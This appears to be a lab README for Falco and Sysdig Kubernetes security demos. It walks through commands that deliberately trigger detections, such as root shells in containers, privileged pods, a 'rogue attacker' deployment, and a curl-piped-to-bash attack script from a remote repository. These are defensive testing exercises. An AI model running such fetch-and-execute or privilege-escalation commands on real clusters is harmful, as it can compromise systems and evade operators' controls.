# Falco Lab Scenario

This YAML file outlined the following items as forbidden_processes - [mount, sudo, su]

```
wget https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/falco-rules/instruqt-mount.yaml
```

Update the falco ruleset

```
helm upgrade falco falcosecurity/falco -n falco --reuse-values -f instruqt-mount.yaml 
```

Make sure pods are recreated after the falco rules update

```
kubectl get pods -n falco
```

list the files as a priveleged user

```
sudo ls
``` 

The log output of the pod should now show that this was an unauthorized process:

```
kubectl logs --selector app.kubernetes.io/name=falco -n falco | grep sudo
```

14:47:49.958251300: Warning Unauthorized process (sudo ls) running k8s.ns container=host </br>
14:47:49.965807188: Warning Unauthorized process (sudo ls) running k8s.ns container=host

```
wget https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/falco-rules/required_engine_version.yaml
```

Execute the following command to re-run Falco with the required engine version of 99:

```
helm upgrade falco falcosecurity/falco -n falco --reuse-values -f required_engine_version.yaml
```

Basically, it'll note that the engine version should be '9' - not '99':

```
kubectl logs --selector app.kubernetes.io/name=falco -n falco
```

Fri Jul 29 19:49:58 2022: Falco version 0.32.1 </br>
Fri Jul 29 19:49:58 2022: Falco initialized with configuration file /etc/falco/falco.yaml </br>
Fri Jul 29 19:49:58 2022: Loading rules from file /etc/falco/falco_rules.yaml: </br>
Fri Jul 29 19:49:58 2022: Loading rules from file /etc/falco/falco_rules.local.yaml: </br>
Fri Jul 29 19:49:58 2022: Loading rules from file /etc/falco/rules.d/my_rules: </br>
Fri Jul 29 19:49:58 2022: Starting internal webserver, listening on port 8765 </br>
<br/>

Until now, you have learned how to use a Detection Engine. Rules were set in place, and when violated an alert would trigger. But in order to enforce security, the next step is to respond. <br/>
<br/>
A Response Engine takes action upon violations of a ruleset. Alerts are now just the messenger to a final action, a response to the violation, that may solve it.<br/>
<br/>
Falco is a Detection Engine, but it can be upgraded to a Response Engine with the help of Falco Sidekick. Another developer-oriented option would be to use the gRPC API.

Install the vulnerability scanner: <br/>
<br/>
https://docs.sysdig.com/en/docs/sysdig-secure/vulnerabilities/pipeline/#running-the-cli-scanner

```
curl -LO "https://download.sysdig.com/scanning/bin/sysdig-cli-scanner/$(curl -L -s https://download.sysdig.com/scanning/sysdig-cli-scanner/latest_version.txt)/linux/amd64/sysdig-cli-scanner"
```

```
chmod +x ./sysdig-cli-scanner
```

Running the Vulnerability Scanner: <br/>
<br/>
You can scan images by running the sysdig-cli-scanner command:
```
SECURE_API_TOKEN=<your-api-token> ./sysdig-cli-scanner --apiurl <sysdig-api-url> <image-name>
```

FAILED:
```
SECURE_API_TOKEN="***a*ca9-***c-4**4-80**-63***e8c***4" ./sysdig-cli-scanner   sysdiglabs/dummy-vuln-app  --apiurl https://eu1.app.sysdig.com
```
PASSED:
```
SECURE_API_TOKEN="***a*ca9-***c-4**4-80**-63***e8c***4" ./sysdig-cli-scanner   ubuntu/apache2  --apiurl https://eu1.app.sysdig.com
```

DIRTY ROGUE IMAGE:
```
SECURE_API_TOKEN="***a*ca9-***c-4**4-80**-63***e8c***4" ./sysdig-cli-scanner   gcr.io/tigera-demo/attacker-pod  --apiurl https://eu1.app.sysdig.com
```

<img width="937" alt="Screenshot 2022-08-02 at 10 56 51" src="https://user-images.githubusercontent.com/109959738/182347421-eaf7f5a0-ed59-474a-bf2a-78f1688fc5b1.png">



Full image results here: https://eu1.app.sysdig.com/secure/#/scanning/assets/results/****/overview (id *****) <br/>
Execution logs written to: /home/cloudshell-user/scan-logs

```
helm upgrade sysdig sysdig/sysdig-deploy \
    --namespace sysdig-agent \
    --create-namespace \
    --set global.sysdig.accessKey=${SYSDIG_ACCESS_KEY} \
    --set global.sysdig.region=${SAAS_REGION} \
    --set global.clusterConfig.name=${CLUSTER_NAME} \
    --set agent.sysdig.settings.collector=${COLLECTOR_ENDPOINT} \
    --set nodeAnalyzer.nodeAnalyzer.apiEndpoint=${API_ENDPOINT} \
    --set global.kspm.deploy=true
```

<img width="669" alt="Screenshot 2022-08-02 at 14 51 20" src="https://user-images.githubusercontent.com/109959738/182391545-97b0ad1f-a277-4143-aa18-27c1d90102ec.png">

```
helm upgrade rapid-response sysdig/rapid-response \
  --namespace sysdig-rapid-response \
  --create-namespace \
  --set sysdig.accessKey=${SYSDIG_ACCESS_KEY} \
  --set rapidResponse.passphrase=${PASSPHRASE} \
  --set rapidResponse.apiEndpoint=${API_ENDPOINT}

echo "The rapid response passphrase is ${PASSPHRASE}"
```

Run container as root:

Use ``` kubectl describe pod ... ``` to find the node running your Pod and the container ID (docker://...) <br/>
Run ``` docker exec -it -u root ID /bin/bash ```
Run ``` kubectl exec-as -u <username> <podname> -- /bin/bash ```

<img width="1383" alt="Screenshot 2022-08-08 at 12 30 49" src="https://user-images.githubusercontent.com/109959738/183408612-fdc7f37f-b26b-49e3-8848-d59a593d69c1.png">

## Shell Demo

Create the pod:
``` 
kubectl apply -f https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/Automation/shell-demo.yaml
```

Verify the pod is running:
``` 
kubectl get pod shell-demo
``` 

Get a shell to the running container:
``` 
kubectl exec --stdin --tty shell-demo -- /bin/bash
``` 

In your shell, list the root directory:
``` 
# Run this inside the container
ls /
``` 

<img width="1079" alt="Screenshot 2022-08-09 at 10 30 53" src="https://user-images.githubusercontent.com/109959738/183615478-fb3e1c03-5109-41ea-8e22-e8f82d25fe3f.png">



In your shell, experiment with other commands. Here are some examples:
``` 
# You can run these example commands inside the container
ls /
``` 
``` 
cat /proc/mounts
``` 

``` 
cd /tmp
```

``` 
cat /proc/1/maps
``` 
``` 
apt-get update
```
```
apt-get install -y tcpdump
```
```
tcpdump
```
```
apt-get install -y lsof
```
```
lsof
```
```
apt-get install -y procps
```
```
ps aux
```
```
ps aux | grep nginx
``` 

## Cluster Scaling

I scale the cluster down to '0' nodes to ensure no unnecessary costs are accrued:
``` 
eksctl scale nodegroup --cluster nigel-eks-cluster --name ng-215e1f2e --nodes 0
```

<img width="875" alt="Screenshot 2022-08-09 at 11 57 29" src="https://user-images.githubusercontent.com/109959738/183631890-f10ec4c3-9a00-41cd-8a6d-6235250f7054.png">

## Terminal Shell in Container
```
kubectl create ns knp-test 
```
```
kubectl create deployment --namespace=knp-test nginx --image=nginx
```
```
kubectl expose --namespace=knp-test deployment nginx --port=80
```
Medium Severity Command:
```
kubectl run --namespace=knp-test access --rm -ti --image busybox /bin/sh
```
```
wget -q --timeout=5 nginx -O -	
```
```
kubectl delete ns knp-test	
```

## Alert on activity in Storefront namespace

```
kubectl apply -f https://installer.calicocloud.io/storefront-demo.yaml
```

Introduce a rogue attacker application:
```
kubectl apply -f https://installer.calicocloud.io/rogue-demo.yaml -n storefront
```

Find out the label of pods to exec into:
```
kubectl get pods -n storefront --show-labels
```



Critical Severity Command:
```
"kubectl exec --namespace=storefront -it \
  $(kubectl get pod -l "app=frontend" \
    --namespace=storefront -o jsonpath='{.items[0].metadata.name}') -- /bin/sh"
```

List processes:
```
ps
```
Review source:
```
cat voter.py
```

## Self-Service Activity Scanner

```
wget https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/Automation/security-checks.sh
```

```
sudo chmod +x security-checks.sh 
```

```
ls | grep *.sh
```

```
cat security-checks.sh
```

## Privileged Shell Spawned Inside Container
```
sh -c curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash
```

## Drift Control:

```
kubectl create ns drift-control
```

Create an Nginx pod within the drift-control namespace
```
kubectl run nginx -n drift-control --image=nginx --restart=Never
```

NB: Let it run for 24 hours before running exec session on pod
```
kubectl exec -it pod/nginx -n drift-control -- sh
```
The below commands will not work due to being in unprivleged mode:

```
mount -t tmpfs none /tmp
```

```
mount -t securityfs none /sys/kernel/security
```

So we proceed to build a workload with the required permissions
```
kubectl apply -f https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/workloads/priviliged-pod.yaml -n drift-control
```

Verify that the Pod's Container is running:
```
kubectl get pod test-pod-1 -n drift-control
```

Get a shell to the running Container:
```
kubectl exec -it test-pod-1 -n drift-control -- sh
```

## CRITICAL: Suspicious Home Directory Creation

Yum update should fail
```
yum update
```

Go to the /etc/yum.repos.d/ directory.
```
cd /etc/yum.repos.d/
```

Run the below commands
```
sed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*
sed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*
```

Now run the yum update
```
yum update -y
```

Check the Web UI --> Suspicious Home Directory Creation GENERATED <br/>
Identified unusual activity related to Malwares - ``` useradd -r -u 59 -g tss -d /dev/null -s /sbin/nologin -c Account used for TPM access tss ```

## Priviliged Pod Alert
```
kubectl apply -f https://raw.githubusercontent.com/n1g3ld0ugla5/sysdig-lab/main/workloads/priviliged-pod.yaml
```

```
kubectl get pods -n drift-control
```

```
kubectl exec --stdin --tty test-pod-1 -n drift-control -- /bin/bash
```




<br/>
<br/>
<br/>


## Daniella's Drift Flow:

<img width="1434" alt="Screenshot 2022-08-19 at 11 43 15" src="https://user-images.githubusercontent.com/109959738/185602706-0506dc93-fc3c-4655-a536-3427850c1d63.png">

Create a simple deployment
```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.14.2
        ports:
        - containerPort: 80
```

Exec into the pod to make binary changes
```
kubectl exec pod/nginx-deployment-**** -it -- bash
```

Install kubectl binary with curl on Linux
```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" --insecure
```

If it fails (and it should), make sure to run kubectl update
```
apt update
```

Proceed to install cURL so that we can download the binary
```
apt install curl
```

Then follow the kubectl install flow identified in: <br/>
https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/


This should trigger the alerts within the web UI:
<img width="1434" alt="Screenshot 2022-08-19 at 11 38 43" src="https://user-images.githubusercontent.com/109959738/185602537-d510a079-118d-4ea4-ada2-4658fba49d08.png">




